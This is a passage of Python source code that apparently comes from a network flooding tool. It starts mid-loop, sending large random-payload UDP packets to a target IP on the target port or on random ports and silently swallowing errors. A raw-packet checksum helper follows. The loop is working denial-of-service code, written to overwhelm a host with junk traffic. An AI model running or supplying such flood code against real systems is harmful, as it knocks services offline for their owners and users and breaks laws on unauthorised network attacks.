            port = target_port if random.random() < 0.3 else random.randint(1, 65535)
            data = random._urandom(random.randint(1024, 65507))
            sock.sendto(data, (ip, port))
            sent_count += 1
        except:
            pass

def checksum(data):
    """Calculate checksum for raw packets"""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s = (s >> 16) + s
    return ~s & 0xffff

